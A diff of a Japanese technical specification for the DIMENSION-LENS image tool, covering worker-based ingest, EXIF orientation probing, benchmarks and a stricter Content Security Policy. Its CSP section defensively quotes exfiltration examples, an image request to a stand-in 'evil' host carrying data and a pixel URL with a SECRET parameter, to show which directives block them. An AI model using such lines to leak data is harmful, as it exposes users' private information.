@@ -1,7 +1,8 @@
 # DIMENSION-LENS 仕様書
 
-> 版: **Phase 1a-i 時点**（色と持ち上げの純粋パイプライン —— [#6](https://github.com/ops324/dimension-lens/pull/6) マージ済み）
-> 公開: <https://ops324.github.io/dimension-lens/>（現状は空ページ。描画は Phase 1a-iii から）
+> 版: **Phase 1a-ii 時点**（取り込み —— [#8](https://github.com/ops324/dimension-lens/pull/8) マージ済み）
+> 公開: <https://ops324.github.io/dimension-lens/>（現状は空ページ。ただし取り込みは動いており、
+> `data-lens-ingest="ok"` が本番ページに出る。描画は Phase 1a-iii から）
 
 ---
 
@@ -46,7 +47,11 @@ Phase 0 の表に残っていた（GPU 経路の行）。中間を許すと、�
 文書中の約束を機械が見るものへ移し替えたものである。表の行が増えるより、
 テストが増えるほうが望ましい。
 
-### Phase 0 時点の到達水準
+### 到達水準（Phase 1a-ii 時点）
+
+**この見出しは長らく「Phase 0 時点の到達水準」のままだった** ── 中身は Phase 1a-i の
+実測（スプライト定数・OKLab 行列・退化判定）を含んでいたので、見出しが表の内容について
+嘘をついていた。表を正直に保つ規律（§0.1）は表の**外側**にも掛かる。
 
 | 主張 | 水準 | 根拠 / 上げる方法 |
 |---|---|---|
@@ -72,7 +77,18 @@ Phase 0 の表に残っていた（GPU 経路の行）。中間を許すと、�
 | `Texture` 既定は `NoColorSpace` / `color_vertex` はデコードしない | **B** | `node_modules/three/src/textures/Texture.js:48` と `ShaderChunk/color_vertex.glsl.js` を自分で開いて確認。LENS では未実行 |
 | `NeutralToneMapping` は恒等ではない | **A** | GLSL 実ソース + 数値実測（§4.5）。sRGB 128→**116**、63→**33**、200→**194** |
 | **half-float 加算の飽和天井は 0.03125** | **A** | `Float16Array` で実測（§4.6）。実際の重なり数 326/489 では**飽和しない**ことも確認 |
-| **ブラウザの縮小はガンマ空間平均** | **A**（Chrome 148） | 黒白2px→1px が **128**（リニア光平均なら 188）。`drawImage` と `createImageBitmap({resizeWidth})` の両方（§4.7）。他ブラウザは未測定 |
+| **ブラウザの縮小はガンマ空間平均** | **A**（Chrome 148） | 黒白2px→1px が **128**（リニア光平均なら 188）。`drawImage` と `createImageBitmap({resizeWidth})` の両方（§4.7）。**Phase 1a-ii で bitmap→bitmap 経路と `resizeQuality` 3 段でも再確認**。他ブラウザは未測定 |
+| **EXIF の向きはデコーダから降りられない** | **A**（Chrome 148） | `imageOrientation:'none'` が既定と 1 ビットも変わらない。`<img>` も同じ。§4.12 |
+| **だから LENS は画素を回さない**（二重適用の禁止） | **A** | 317B の probe が実行時に `'applied'` を返している。§4.12 |
+| Safari / Firefox の EXIF 挙動 | **C** | この環境では測れない。**だから probe が実行時に測る**。`'not-applied'` 時の自前回転は Phase 1c |
+| **取り込みがメインスレッドを塞がない** | **A** | 24MP で最長遮断 **11.8 ms**（予算 16.7）。同じ仕事をメインでやると **88.0 ms**。§7.5 |
+| **取り込み各段の CPU** | **A** | `npm run bench`。正準 2048×2048（最悪）で linearize 17.53 / stats 26.26 / lift 16.93 ms。§4.14 |
+| **正準バッファが worker に常駐する** | **A** | `relift` が再デコードなしで格子を引き直す。`ingest.test.ts` / 実機起動報告 |
+| **`safeDist` が実際に配線されている** | **A**（Phase 1a-i では C） | `session.ts` が `lift` と同じ場所で返す。起動実測 maxNorm 1.5339 → safeDist 3.3746 > 2·maxNorm。§4.9 |
+| **worker を入れてもバンドルに通信 API が無い** | **A** | `privacy.test.ts`。dist 全走査で 8 種 0 件、`createObjectURL` も 0 件 |
+| **CSP 下で same-origin worker が起動する / `blob:` worker は塞がれる** | **A** | preview 実測。violation の `effectiveDirective = worker-src`（§6.3） |
+| `worker-src` に `blob:` が要る | **偽**（Phase 0 の未検証な仮定） | 「vite の出力形式によっては要るかもしれない」で**確かめずに開けていた**。same-origin チャンクで足りる。§6.1 |
+| Display P3 の入力経路 | **C** | 1a-ii は `gamut: 'srgb'` 固定。4 箇所同時に揃わないと黙って色相が誤り、node では守れない。Phase 1c |
 | 軸ごと正規化は (3,4) を色相回転でなくする | **B** | `D⁻¹RD ∉ SO(2)`（s_a≠s_b）は代数的に確定。→ ブロック等方正規化 |
 | clear color 漏れの機序 | **B** | 親に実測（`#05060f` が `rgb(22,27,58)` として届く）。LENS では未測定 |
 | 加算ブレンドが列平均そのものである | **B** | 線形 HDR ターゲット上でのみ真。Phase 1b の #3/#4 を通せば A |
@@ -201,7 +217,10 @@ bin の中に埋もれている。純グレースケール（全標本 `r²=0`�
 
 ---
 
-## 4. ホットパス
+## 4. ホットパスと取り込み
+
+（節番号は動かさない ── §4.7 以降を他所から参照しているので、取り込みの節は
+**挿入ではなく追加**（§4.12〜§4.14）にしてある。見出しのほうを内容に合わせた。）
 
 ### 4.1 なぜ `rotateBatch` を毎フレーム呼ばないか
 
@@ -322,9 +341,49 @@ ulp = 2⁻¹⁵ すなわち A = 2⁻⁵。停止点は n に依らない。
 `columnMeans` / `globalMean` は**正準リニアバッファから**計算する（グリッドからではない）。
 2048px 時点の残差は近傍が強く相関しているため小さいが、ゼロではない。
 
-なお `createImageBitmap` の resize オプションは Chrome で実際に効いた（返却 1×1）。
-Safari は**未知のディクショナリメンバを黙って無視する**ので、例外ではなく
-`bitmap.width` を要求値と比較して機能検出すること。
+**Phase 1a-ii で bitmap→bitmap 経路と `resizeQuality` の 3 段でも再確認した** ──
+`'high'` / `'medium'` / `'low'` のどれでも黒白 2px→1px は **128**。品質設定を上げても
+リニア光にはならない。だから縮小は 1 回で終わらせる、という結論は変わらない。
+
+#### 訂正 1 —— 「未知メンバの黙殺」は Safari 固有ではない（Phase 1a-ii で実測）
+
+初版は「Safari は未知のディクショナリメンバを黙って無視する」と書いていた。
+**帰属が不正確である。** Chrome 148 でも `createImageBitmap(src, { lensNoSuchMember: 1 })` は
+素通りする ── これは WebIDL のディクショナリ全般の挙動であって、特定の実装の欠陥ではない。
+Safari で問題になったのは `resizeWidth` を**実装していなかった**からで、
+そのとき初めてそれが「未知のメンバ」になった。
+
+結論（`bitmap.width` を要求値と比較せよ）は正しいまま。ただし**検出手段が 2 段ある**ことが
+分かったので、両方を測る（§4.13）。
+
+#### 訂正 2 —— 「最初の縮小だけブラウザに任せる」は 1 回では成立しない（Phase 1a-ii で実測）
+
+`createImageBitmap(blob, { resizeWidth: 2048, ... })` の 1 回では書けない。三重に壊れる:
+
+1. **`resizeWidth` は EXIF 適用後の幅に効く。** 8×2 に Orientation=6 を付けたもの
+   （向き適用後 2×8）に `{resizeWidth:4}` を渡すと **4×16** が返る。縦長画像では
+   高さが上限を超えたまま通り、**「長辺 ≤ 2048」は片側指定では表現できない**。
+   両方指定するとアスペクト比が壊れる（明示指定が勝つ: `{4,1}` → 4×1）。
+2. **無条件に渡すと小さい画像を拡大する。** 64×32 の **772 バイト**の JPEG が
+   **2048×1024** になり、正準バッファが **24 MB**（元画像の 3 万倍）になる。例外は出ない。
+3. **`resizeQuality` の既定は `'low'`。** 明示しないと縮小品質が黙って落ちる。
+
+コスト（24MP JPEG 6000×4000 → 2048×1365、3 回の中央値）:
+
+| | ms |
+|---|---|
+| フルデコードのみ | 227.9 |
+| `resizeQuality` **省略（＝既定の `'low'`）** | 294.5 |
+| `'medium'` | 602.3 |
+| `'high'` | 600.7 |
+
+→ **2 段デコードにする。** 1 段目（`createImageBitmap(blob)`）で向きの適用された寸法を
+確定させ、それを `planResize()` に渡し、2 段目（`createImageBitmap(bitmap, {...})`）で縮小する。
+1 段目の出力がそのまま正しい寸法なので、**EXIF パーサは 1 バイトも要らない**。
+`resizeQuality: 'high'` は明示する（錨のために取り込みで 1 回だけ払う）。
+
+`planResize` は純関数として `src/ingest/plan.ts` にあり、
+「**拡大しない**」を node で落とせるテストにしてある。
 
 ### 4.8 透視カスケードの真の不変条件
 
@@ -360,7 +419,18 @@ r · dist/(dist − r) < dist   ⟺   dist > 2r
 
 → `lift()` が `maxNorm` を返し、`safeDist(maxNorm)`（`math/rotationN.ts`）が
 `max(2.4, 2.2·maxNorm)` を返す。標本では 3.316。
-**Phase 1a-iii は必ずこれを呼ぶこと** ── 現状は実装とテストがあるだけで、配線はまだ無い。
+
+**Phase 1a-ii で配線した（C → A）。** 初版の本節は「Phase 1a-iii は必ずこれを呼ぶこと」と
+書いていたが、**「必ず呼ぶこと」は仕組みではない** ── 呼び忘れても `F_CLAMP` があるので
+NaN にはならず、無音で壊れる。だから呼び忘れようのない位置へ移した:
+`ingest/session.ts` が `lift` を呼んだ**その場で** `safeDist(maxNorm)` を計算して応答に載せる。
+dist を決める側が `maxNorm` を持っていない、という状態を作らない。
+
+**`maxNorm` は格子に依存する**ことも分かった。標本 No.0 は
+`fitGrid(…, 4000)` で 1.5074、起動時の BALANCED 格子（251×157）で **1.5339**
+── 細かい格子ほどセル平均の平滑化が弱く、外れ値が残る。
+だから `safeDist` は**取り込み時に 1 回**ではなく、**格子を引き直すたびに**計算する
+（`relift` も同じ関数を通る）。
 
 ### 4.10 スプライト定数 —— 設計が 45 倍外していた（Phase 1a-i で実測）
 
@@ -413,6 +483,116 @@ Ottosson は丸めた行列を公表しているので、合成では再現で�
 
 ---
 
+### 4.12 EXIF の向きは切れない —— だから回さない（Phase 1a-ii で実測）
+
+設計案は「EXIF を自分でパースして、自分で画素を回す」だった。**Chrome では確実に
+二重適用になる。** `canvas.toBlob('image/jpeg')` の出力に APP1(Exif, Orientation=N) を
+注入した 4×2 の JPEG（左上のみ赤）で測った:
+
+| 入力 | 既定 | `imageOrientation:'none'` |
+|---|---|---|
+| EXIF 無し | 4×2, red(0,0) | — |
+| Orientation=1 | 4×2, red(0,0) | — |
+| Orientation=3（180°） | 4×2, red(3,1) | — |
+| Orientation=6（90°CW） | **2×4**, red(1,0) | **2×4, red(1,0) ── 完全に同一** |
+| Orientation=8（90°CCW） | **2×4**, red(0,3) | — |
+
+`<img>` の `naturalWidth/Height` も 2×4。**降りる手段が無い。**
+
+そして `{ imageOrientation: 'lens-bogus' }` は **TypeError を投げる** ──
+つまり `'none'` は「黙って無視された未知メンバ」ではなく、**認識された上で無効**である。
+§4.7 が想定していた検出法（メンバを投げてみる）では**捕まらない**。
+
+**残る検出手段は 1 つ: 向きの分かっている画像を実際に通す。**
+`src/ingest/orientProbe.ts` に 317 バイトの JPEG（画素 2×1、EXIF は Orientation=6 のみ）を
+定数で置き、実行時にデコードする:
+
+| 返る寸法 | 判定 |
+|---|---|
+| **1×2** | `'applied'` ── デコーダが回した。**LENS は何もしない** |
+| **2×1** | `'not-applied'` ── 読み出しに警告を出す。自前回転は Phase 1c |
+| それ以外 / 失敗 | `'unknown'` ── 安全側。「適用された」に倒さない |
+
+「2×1 でなければ適用された」と書くと、probe 定数が壊れたときに**嘘をつく**。
+だから 3 値にし、`ingest.test.ts` が probe のバイト列（Orientation=6 と SOF の 2×1、317 バイト）を
+自前で読んで固定している ── 定数が壊れると probe は黙って `'unknown'` を返す、
+つまり「向きの検証を諦めた」ことに誰も気づかないため。
+
+**`'not-applied'` 用の自前回転を今は書かない。** Chrome では絶対に走らない経路をいま書くと、
+テストは緑・実機は未検証の死にコードになる。しかも**正方形の写真では寸法が変わらないので
+二重適用に気づけない**。
+
+### 4.13 機能検出には 2 つの質問がある（Phase 1a-ii で実測）
+
+**「メンバが実装されているか」と「実際に効いたか」は別の質問である。**
+§4.12 の `imageOrientation` がまさに、**実装済みなのに効かない**例だった。
+
+| 質問 | 測り方 | 実測 |
+|---|---|---|
+| メンバは実装されているか | **不正な列挙値**を渡す。TypeError なら実装済み | `imageOrientation` / `resizeQuality` / `colorSpaceConversion` / `premultiplyAlpha` すべて実装済み。対照の存在しないメンバは投げない |
+| 実際に効いたか | `bitmap.width` を要求値と比較（§4.7） | `resizeWidth/Height` は効いた |
+
+両方を測って両方を持ち回る（`src/ingest/capabilities.ts`）。判定は純関数
+`summarizeCapabilities()` に切り出してあり、node でテストできる。
+
+**測れないものもある。** `premultiplyAlpha` が効いたかを読み出す API は無い（水準 **B**）。
+1a は不透明画像しか扱わないので無害だが、α を軸にする Phase 6 では効いてくる。
+
+もう一つの黙殺: **同じキャンバスに 2 回目の `getContext('2d', 別の属性)` を呼ぶと、
+最初の context がそのまま返り、属性は無視される**（実測）。`willReadFrequently` を
+指定したつもりで効いていない、が起こるので、キャンバスは毎回使い捨てにする。
+
+### 4.14 取り込みの CPU と、worker が肩代わりしているもの（Phase 1a-ii で実測）
+
+`npm run bench`（`src/bench/ingest.bench.ts`）。Apple M1 Max / Node 24.13.0 / vitest bench。
+
+| 正準バッファ | `linearizeRgba` | `computeStats` | `lift` → ULTRA | 合計 |
+|---|---|---|---|---|
+| 2048×1365 (3:2) | 11.13 ms | 21.65 ms | 14.16 ms | **46.94 ms** |
+| 2048×1536 (4:3) | 13.32 ms | 22.63 ms | 14.83 ms | **50.78 ms** |
+| 2048×2048 (1:1・最悪) | 17.53 ms | 26.26 ms | 16.93 ms | **60.72 ms** |
+
+16.7 ms のフレーム予算の **2.8〜3.6 倍**。
+
+**worker が要るのはデコードが重いからではない。** `createImageBitmap` は 24MP・resize 込みでも
+メインスレッドを最長 **0.3 ms** しか止めない（元からオフスレッド）。止めているのは
+読み戻し以降 ── 上の表の合計である。
+
+**そして正準バッファはメインではなく worker に常駐させる。** 設計案は「メインが
+`linearizeRgba` の 13〜18ms を払わずに済む」ことしか見ていなかったが、大きいのは
+`computeStats` と、**ティアが変わるたびに再実行される `lift`** のほう。
+正準をメインに置くとその合計がメインに固定される。
+
+メインへ渡すのは派生物だけで、これは小さい ── ULTRA でも `base` 3.04MB + `colors` 1.82MB、
+`columnMeans` は 0.02MB。正準は最悪 48.00MB（2048×2048 の f32×3）。
+
+| 正準バッファ | 画素数 | f32×3 | RGBA8 |
+|---|---|---|---|
+| 1:1 2048×2048 | 4,194,304 | **48.00 MB** | 16.00 MB |
+| 4:3 2048×1536 | 3,145,728 | 36.00 MB | 12.00 MB |
+| 3:2 2048×1365 | 2,795,520 | 31.99 MB | 10.66 MB |
+| 16:9 2048×1152 | 2,359,296 | 27.00 MB | 9.00 MB |
+
+**中間ピークは測っていない（水準 C）。** `performance.measureUserAgentSpecificMemory` は
+`crossOriginIsolated` を要求し、GitHub Pages は必要なヘッダを設定できないので
+**この作品では原理的に測れない**。40MP 入力の原寸 RGBA8 が 151.88 MB であることは算術で分かる。
+実機は Phase 1c。
+
+#### 転送リストを型から導出する
+
+`postMessage(msg)` は転送リストを**忘れても動く**。動いたうえで構造化複製が走るだけなので、
+症状は例外ではなく「なんとなく重い」である（実測: 32MB の往復が転送 **11.4ms** に対し
+複製 **53.6ms**）。だから転送リストを呼び出し側の注意力に置かず、
+`transferablesOf(res)` という**応答の形から決まる関数**にした。
+応答の kind を足して書き忘れると `_AllResponseKindsListed` が `tsc` を落とす。
+
+板（Phase 1a-iii のテクスチャ源）も同じ経路で返す ──
+`OffscreenCanvas.transferToImageBitmap()` の返り値は Transferable で、
+転送後は元が 0×0 になる（実測）。**これを 1a-ii のプロトコルに入れておかないと、
+1a-iii が同じ画像をもう一度デコードすることになる。**
+
+---
+
 ## 5. 移植境界
 
 ### 真の VERBATIM
@@ -452,9 +632,24 @@ dimension は 2 日で 21 PR を吐いており、観測窓は丸 1 日、しか
 ```
 default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob:; font-src 'self'; connect-src 'none';
-worker-src 'self' blob:; object-src 'none'; media-src 'none'; manifest-src 'none';
+worker-src 'self'; object-src 'none'; media-src 'none'; manifest-src 'none';
 form-action 'none'; base-uri 'none'; upgrade-insecure-requests
 ```
+
+**`worker-src` から `blob:` を落とした（Phase 1a-ii）。** Phase 0 は
+「vite の worker 出力形式によっては blob: が要るかもしれない」という理由で開けていた ──
+つまり**何が出るか確かめないまま**開けた許可だった。worker を実装して確かめた結果:
+
+- `new Worker(new URL('./worker.ts', import.meta.url), { type: 'module' })` は
+  `dist/assets/worker-*.js` という same-origin チャンクになる。`blob:` を使わない
+- CSP を載せた本番ビルドで worker の起動と往復が成功し、violation は **0 件**
+- `blob:` が要るのは `?worker&inline` を選んだときだけで、そちらは採っていない
+
+落とした結果、`blob:` worker が**実際に塞がれる**ことも確認した（§6.3）。
+`img-src` の `blob:` は残す ── object URL のために Phase 1c で実際に使う。
+
+**使っていない許可は、開けた理由を誰も覚えていない許可になる。**
+これは「念のため広めに開けておく」が、確かめなかったことの記録として残る形の一例だった。
 
 - **`connect-src 'none'` だけでは何も閉じていない。** CSP はディレクティブごとに default-allow なので、
   `new Image().src = 'https://evil/?p=' + data` がそのまま通る。**`img-src` を閉じるほうが重要。**
@@ -501,6 +696,8 @@ CSP 違反が発火し**、violation を購読して測るプライバシー検�
 | `fetch('https://example.com/probe')` | blocked: Failed to fetch | `connect-src` |
 | `new Image().src = 'https://example.com/pixel.gif?p=SECRET'` | blocked（onerror） | **`img-src`** |
 | `new WebSocket('wss://example.com/x')` | コンストラクタは成功、接続は阻止 | `connect-src` |
+| **`new Worker(blob:…)`**（Phase 1a-ii で追加） | **blocked（onerror）** | **`worker-src`** |
+| `new Worker('/assets/worker-*.js', {type:'module'})` | **成功**（`capabilities` 応答が返る） | —— |
 
 2 行目が要点である。**初版の計画のように `connect-src 'none'` だけを書いていたら、
 この経路は素通りしていた** —— そして画像を保持しているアプリにとって、これが一番塞ぐべき穴だった。
@@ -514,14 +711,19 @@ A にはならない —— 「出ない」の証明には無限の反証が要�
 ### 6.4 残留物
 
 Phase 1c で対処し、ここに列挙する: `<input type="file">` の `FileList`（`input.value=''`）、
-object URL の revoke、`ImageBitmap.close()`、bfcache 復帰、`localStorage`（品質ティア 1 項目）、
+object URL の revoke、bfcache 復帰、`localStorage`（品質ティア 1 項目）、
 `Referer`（`<meta name="referrer" content="no-referrer">` を Phase 0 で投入済み）。
+
+**`ImageBitmap.close()` はこの一覧から外した（Phase 1a-ii で対処済み）。**
+`decode.ts` が中間 bitmap を閉じ、`main.ts` が板を差し替えるときに前の板を閉じ、
+`session.release()` が正準バッファを手放す。後から足すと「どこで持っているか」の一覧が
+既に長くなっているので、持ち始めたその PR で閉じた。
 
 ---
 
 ## 7. 検証
 
-### 7.1 vitest（Phase 1a-i 時点で 145 件・全緑）
+### 7.1 vitest（Phase 1a-ii 時点で 177 件・全緑）
 
 **Phase 0:** `math.test.ts`（親からの回帰ロック）/ `rotationN.test.ts`（融合カーネル等価性・
 カスケード不変条件）/ `vendor.test.ts`（出自とチェックサム）/ `privacy.test.ts`（ビルド成果物の静的検査）。
@@ -531,11 +733,30 @@ object URL の revoke、`ImageBitmap.close()`、bfcache 復帰、`localStorage`�
 **落ちること**まで確かめる）/ `image.test.ts`（格子・標本・統計・`columnMeans`・`lift` の全要素固定・
 退化入力・`maxNorm`）/ `spriteGain.test.ts`（リップル**と水準**を分けて）/ `fit.test.ts`（フレーミング）。
 
+**Phase 1a-ii:** `protocol.test.ts`（転送リストの導出・detach の観測・`DataCloneError`）/
+`ingest.test.ts`（`planResize` の「拡大しない」・probe 定数のバイト列・機能検出の判定・
+**node に無いものの境界**）。
+
 **テストの歯**（落ちうることを確かめた項目）: 軸ごとスケールで彩度不変が破れること /
 設計当初のスプライト定数が 40% 超だったこと / `kSprite²` を落とすとゲイン水準がずれること /
-Ottosson 係数と 1e-9 では**一致しない**こと。
+Ottosson 係数と 1e-9 では**一致しない**こと /
+**`planResize` が拡大するようにすると落ちること** /
+**probe 定数の Orientation を 6→7 にすると落ちること** /
+**`transferablesOf` から `base` を落とすと落ちること** /
+**CSP に `worker-src … blob:` を戻すと落ちること**（4 件とも実際に壊して確認した）。
 
-Phase 1a-ii 以降で追加: `protocol.test.ts`、`rotationSchedule.test.ts`（アンカーで角度が厳密に 0）、
+#### node で測れないものの境界を、機械で見張る
+
+`ingest.test.ts` の末尾に「**node には `createImageBitmap` / `OffscreenCanvas` / `Worker` が
+存在しない**」というテストが 1 本ある。緑であることは
+「これらを node でテストしていない」という**宣言**である。
+
+`vi.stubGlobal('createImageBitmap', …)` で decode 経路のテストを書こうとすると、
+この節が落ちて理由が読める ── stub で埋めた経路は、実装が壊れていても緑になる。
+node で本当に落とせるのは `protocol` / `plan` / probe のバイト列 / 機能検出の**判定ロジック**だけで、
+`decode.ts` の実体と機能検出の**結果**は実ブラウザでしか測れない。
+
+Phase 1a-iii 以降で追加: `rotationSchedule.test.ts`（アンカーで角度が厳密に 0）、
 `colorPointBatch.test.ts`（`instanceCount !== Infinity`、`addUpdateRange` の単位）、
 `engineConfig.test.ts`、潰しの同一性（1b）、プレートの不透明契約と語彙の規律（Phase 3）。
 
@@ -551,8 +772,30 @@ Phase 1a-ii 以降で追加: `protocol.test.ts`、`rotationSchedule.test.ts`（�
 
 → `window.__LENS__`（DEV ビルドのみ、`src/dev/hook.ts`）:
 `renderOnce` / `setDimLevel` / `freezeRotation` / `setBloom` / `setGrade` / `setCompress` /
-`readback` / `stats`。未実装のメソッドは**黙って何もしない**のではなく投げる ——
-「測ったつもり」が一番高くつく。
+`readback` / `stats`、そして Phase 1a-ii で
+`capabilities` / `ingestReport` / `ingestBlob` を追加。未実装のメソッドは
+**黙って何もしない**のではなく投げる ——「測ったつもり」が一番高くつく
+（1a-ii 時点で `renderOnce()` が実際に投げることを実機で確認した）。
+
+**本番ビルドには載らない。** preview(:4173) で `window.__LENS__` が `undefined` である
+ことも確認済み —— CSP を測るのは preview、フックの数値を取るのは dev(:5173) と、
+測る場所が 2 つに分かれる。`.claude/launch.json` に両方の設定があるのはそのため。
+
+#### 測定器そのものが壊れている場合（Phase 1a-ii で 3 回踏んだ）
+
+上の 1.〜3. は「測る対象」の話だったが、**測定器の側にも同じ罠がある**。
+
+1. **`requestAnimationFrame` は非表示ペインで止まる。** メインスレッド遮断を rAF で
+   測ろうとして 30 秒タイムアウトした ── 上の 2. がそのまま自分に返ってきた形。
+2. **`setTimeout(…, 0)` も背景で ~1s に絞られる。** 「アイドル時の最長ギャップ 999.2ms」と
+   出て、遮断の測定に使えないことが分かった。使えたのは `MessageChannel` の往復。
+3. **計測器を閉じるのが早すぎると、遮断ギャップを取りこぼす。** 同期ブロックの直後に
+   `end()` を呼ぶと、キューに積まれたメッセージが配送される前にポートを閉じてしまう。
+   最初この形で「メインスレッドも 0.3ms しか止まらない」という**嘘の緑**が出た。
+
+→ **測定器には自己検査を通してから使う。** 意図的に 120ms 止めて **120.2ms** を
+検出できることを確認してから本測定に入った。予算のある測定と同じで、
+「測定器が動いていること」自体に判定を付けないと A を生産できない。
 
 各測定には**予算**を付ける。予算の無い測定は「比べて数字を眺める」であり、A を生産できない。
 測定が落ちたら当該フェーズをマージしない。予算を緩めるのは、緩める根拠をここに書いたときだけ。
@@ -565,7 +808,7 @@ G2 の許容 ±3%(リニア)は中間調で ΔE00 ≈ **0.67** であって、�
 （§4.6 の ≤ 3.0 は **Phase 1b** の平均色・列平均に対する予算であり、1a とは別物。
 借りてきて 1a を緩めてはいけない。）
 
-### 7.3 公開経路の実測（水準 A・Phase 0）
+### 7.3 公開経路の実測（水準 A・Phase 0 / 1a-ii）
 
 <https://ops324.github.io/dimension-lens/> にて:
 
@@ -582,6 +825,17 @@ vite が `<script>` タグごと出力から落とした。そのままなら
 「自前の JS が `script-src 'self'` の下で実際に読めるか」を**一度も検証しないまま**
 「公開経路が揃った」と言うことになっていた。本番でも消えない痕跡（`data-lens="booted"`）は
 そのために置いてある。
+
+**Phase 1a-ii でこの痕跡を 1 つ増やした**: `data-lens-ingest`（`ok` / `failed:<code>`）。
+「JS が読めた」の次に確かめたいのは「**CSP 下で worker が起動して取り込みが完走したか**」で、
+これは本番ビルドでしか測れない（`__LENS__` は DEV にしか載らない）。preview 実測:
+
+| 確認項目 | 結果 |
+|---|---|
+| `data-lens-ingest` | ✅ `"ok"` —— CSP 下で worker 経路の取り込みが完走 |
+| 外向きリクエスト | **0**（`/`・`/assets/index-*.js`・`/assets/worker-*.js` のみ） |
+| コンソールエラー | **0** |
+| `window.__LENS__` | `undefined`（本番には載らない） |
 
 ### 7.4 CI アクションのバージョン
 
@@ -629,6 +883,34 @@ npm は対象にしない。three の exact pin（0.185.1）は意図的な仕�
 > 2025 年の `tj-actions/changed-files` の事例のとおり、第三者アクションはタグ差し替えで
 > 侵害されうる。第一者だから許容している判断を、第三者へ自動的に延長しない。
 
+### 7.5 取り込みのメインスレッド遮断（水準 A・Phase 1a-ii）
+
+（§7.4 は §0.1 の規律 5 から参照されているので番号を動かさず、末尾に足した。）
+
+24MP の JPEG を取り込んだときの、**メインスレッドの最長遮断**。
+計測器は `MessageChannel` の往復で、意図的な 120ms 遮断を **120.2ms** と検出できることを
+先に確認してある（§7.2 の「測定器そのものが壊れている場合」）。
+
+| 経路 | wall | メインスレッド最長遮断 | 判定 |
+|---|---|---|---|
+| **worker（本番の経路）** | 224.3 ms | **11.8 ms** | ✅ 予算 16.7 ms 内 |
+| 同じ仕事をメインスレッドで | 128.6 ms | **88.0 ms** | ❌ 予算の 5.3 倍 |
+
+`createImageBitmap` 自体は 24MP・resize 込みでもメインを最長 **0.3 ms** しか止めない
+（元からオフスレッド）。止めているのは読み戻し以降である。
+
+**この表の ms を CPU 予算として読んではいけない。** 検証に使っているブラウザペインは
+同じ機体の Node に対して**メインスレッドで 3.6〜4.1 倍、worker 内では 23〜28 倍**遅い
+（1e8 回の整数加算: Node 98.3ms / ペインのメイン 400.1ms / ペインの worker 2400ms、
+暖機しても改善しないので JIT ウォームアップではない）。だから worker 経路の wall は
+ここでは膨らんでいる。**この測定が主張しているのは遮断の有無であって、速さではない。**
+CPU 予算は §4.14 の Node 実測で持つ。
+
+この区別は実際に一度誤られた ── Phase 1a-ii の監査サブエージェントは worker で測った値から
+「この環境で CPU 予算を測ってはいけない」と結論したが、**遅いのは worker であって
+ペイン全体ではない**（メインは Node の 4 倍程度）。上の遮断測定はメインスレッドで取っている。
+§0.1 の規律 3（サブエージェントの報告は検証すべき仮説）が効いた例である。
+
 ---
 
 ## 8. 開発の進め方
@@ -658,12 +940,23 @@ PR 本文には必ず:
 |---|---|---|
 | **0** | 骨組みと測る道具（CI・CSP・移植・ベンチ・DEV フック） | ✅ [#1](https://github.com/ops324/dimension-lens/pull/1) |
 | **1a-i** | 色と持ち上げの純粋パイプライン（node/vitest のみ） | ✅ [#6](https://github.com/ops324/dimension-lens/pull/6) |
-| 1a-ii | 取り込み（worker・EXIF・機能検出・正準バッファ常駐） | 次 |
-| 1a-iii | 描画とラダー（engine/postfx/点群/板/回転/DEV フック・G1〜G6） | |
+| **1a-ii** | 取り込み（worker・**EXIF 向きの probe**・機能検出・正準バッファ常駐） | ✅ [#8](https://github.com/ops324/dimension-lens/pull/8) |
+| 1a-iii | 描画とラダー（engine/postfx/点群/板/回転/DEV フック・G1〜G6） | 次 |
 | 1b | 潰し（列平均バッファ・`sampleWeight`・`[0,5]` 全域・平均色） | |
-| 1c | 取り込みの頑健性と空状態（HEIC・EXIF・40MP・退化・`copy.ts` 全文） | |
+| 1c | 取り込みの頑健性と空状態（HEIC・**probe が `'not-applied'` の環境での自前回転と 8 値の検証**・40MP・Display P3・退化・`copy.ts` 全文） | |
 | 2 | 光の質（bloom/grade 再測定・`CompressPass`・quality・光過敏） | |
 | 3 | 作品化（UI・読み出し・キーボード・OGP・モバイルシート） | |
 | 4 | モードB 押し出す（+ auto-dist の純関数化） | |
 | 5 | モードC 観測者の次元 | |
 | 6 | 任意（RGBA→n=6・PNG 書き出し・動画） | |
+
+**「EXIF」が 1a-ii と 1c の両方に立っていたのを分けた。** 同じ語が 2 フェーズにあると
+分担が曖昧になり、実際 1a-ii の設計案は「EXIF を自分で回す」を 1a-ii に持ち込もうとしていた
+（§4.12 のとおり、それは Chrome で確実に壊れる）。いまの分担は:
+
+- **1a-ii**: デコーダが向きを適用したかを **probe で観測する**。適用されている限り何もしない
+- **1c**: probe が `'not-applied'` を返す環境が実在したときの**自前回転**と、
+  Orientation 1〜8 すべての検証
+
+1c の側は**まだ必要性が水準 C** である（Safari / Firefox を測っていない）。
+必要が確認されないまま書くと、テストは緑・実機は未検証の死にコードになる。
